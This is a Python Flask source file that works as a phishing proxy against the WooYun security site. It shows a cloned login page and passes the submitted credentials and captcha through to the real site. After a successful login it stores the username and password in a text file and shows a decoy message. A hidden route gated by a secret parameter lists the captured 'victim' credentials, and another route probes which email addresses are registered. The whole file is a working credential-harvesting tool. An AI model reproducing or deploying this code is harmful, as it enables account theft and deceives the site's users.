#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
    >  Filename : yzu_jw.py
    >  Author   :

 ____                            __  __                   __  __
/\  _`\                         /\ \/\ \                 /\ \/\ \
\ \ \/\ \    ___     ___      __\ \ \_\ \    ___   __  __\ \ \_\ \     __
 \ \ \ \ \  / __`\ /' _ `\  /'_ `\ \  _  \  / __`\/\ \/\ \\ \  _  \  /'__`\
  \ \ \_\ \/\ \L\ \/\ \/\ \/\ \L\ \ \ \ \ \/\ \L\ \ \ \_\ \\ \ \ \ \/\  __/
   \ \____/\ \____/\ \_\ \_\ \____ \ \_\ \_\ \____/\ \____/ \ \_\ \_\ \____\
    \/___/  \/___/  \/_/\/_/\/___L\ \/_/\/_/\/___/  \/___/   \/_/\/_/\/____/
                              /\____/
                              \_/__/

    >  Date     : 15/08/25 - 23:52

'''

from flask import Flask, render_template, session, request, redirect, Response
import logininwooyun
import pickle, os
ROOT = os.path.dirname(os.path.abspath(__file__))

app = Flask( __name__ )
app.secret_key = 'jc\x11\x87W\x00p\xcd\x0c\xa6\x89\xf5\x9ey\xd0\x06\xd9G\x10Y\xedh\xbea'

def mysession():
    return pickle.loads(session["wysession"])

def storitysession(session):
    return pickle.dumps(session)

def gettoken():
    return session["token"]

def save_user_pass(username, pwd):
    with open(ROOT+"/"+"wooyun.txt", "a+") as yoursky:
        yoursky.write(username+"woshifengefu"+pwd+"\n")

@app.route( '/' )
def index():
    return render_template( 'wooyun.html' )

@app.route( '/login', methods=["GET", "POST"]  )
def letin():
    if request.method  == "GET":
        newsession, session["token"] = logininwooyun.gettoken()
        session["wysession"] = storitysession(newsession)
        print "set token", session["token"]
        return render_template( 'login.htm' )

@app.route( '/index.php', methods=["POST"]  )
def checkloginin():
    if 1:
        user = request.form.get("user", "")
        pwd = request.form.get("pwd", "")
        captcha = request.form.get("captcha", "")
        print "user, pwd, captcha", user, pwd, captcha 
        token = gettoken()
        logon_status = logininwooyun.gologin( mysession(), token, captcha, user, pwd )
        print "coming"
        if logon_status is True:
            return '{"code":"A0001","msg":"\u9a8c\u8bc1\u7801\u8f93\u5165\u9519\u8bef"}'
        elif logon_status is False:
            return '{"code":"A0001","msg":"\u767b\u5f55\u5931\u8d25,\u8bf7\u68c0\u67e5\u90ae\u7bb1\u6216\u5bc6\u7801"}'
        elif logon_status == 2:
            return '{"code":"A0001","msg":"\u8fde\u63a5\u5f02\u5e38"}'
        else:
            print "GOT"
            save_user_pass(user, pwd)
            return '{"code":"A0001","msg":"\u6682\u65f6\u672a\u5f00\u653e\u8d2d\u4e70\uff0c\u8bf7\u8010\u5fc3\u7b49\u5f85"}'                

@app.route( '/donttellyou',  methods=["GET", "POST"] )
def index2():
    if request.method  == "GET":
        newsession, session["token"] = logininwooyun.gettoken()
        session["wysession"] = storitysession(newsession)
        print "set token", session["token"]
        return render_template( 'hasregistwooyun.html', gotit=1 )
    else:
        usernames = [item.strip() for item in request.form.get("usernames", "").split("\n")] + ["123", "456"]
        yzm = request.form.get("myyzm", "")
        print "yzm", yzm
        token = gettoken()
        password = "goldisagirl"
        listnum = len(usernames)
        gotit = ""
        logon_status = logininwooyun.gologin( mysession(), token, yzm, "strong@strong.vip", password )
        if logon_status:
            return render_template( 'hasregistwooyun.html', cournum=1, gotit="", msg=u"验证码输入错误" )
        for count, username in enumerate(usernames):
            print count+1, "/", listnum
            logon_status = logininwooyun.gologin( mysession(), token, yzm, username, password )
            if logon_status:
                print "\033[;33m[+]\033[0m \033[;32memail existed\033[0m:", usernames[count-1]
                gotit = usernames[count-1]
                save_user_pass(gotit)
                break
        return render_template( 'hasregistwooyun.html', cournum=1, gotit=gotit, msg=u"您提交的邮箱们都没有注册过乌云" )

@app.route( '/captcha' )
def giveyouacaptcha():
    newsession, content = logininwooyun.getcaptcha(mysession())
    session["wysession"] = storitysession(newsession)
    return Response( content, mimetype='image/jpeg' )

@app.route( '/captcha.php' )
def captchaphp():
    return giveyouacaptcha()

def read_user_pass():
    try:
        with open(ROOT+"/"+"wooyun.txt") as yoursky:
            return [person.strip().split("woshifengefu") for person in yoursky]
    except:
        return []

@app.route( '/wyvictim', methods=['GET'] )
def victimdata():
    isok = request.args.get( 'woo', '' )
    if isok != "yun":
        return render_template( 'list_victim.html', userinfos=enumerate([]) )
    print read_user_pass()
    return render_template( 'list_victim.html', userinfos=enumerate(read_user_pass()) )

if __name__ == '__main__':
    app.run( host="127.0.0.1", port=7777, debug=True )
    #app.run( host="127.0.0.1", port=7777, debug=True )
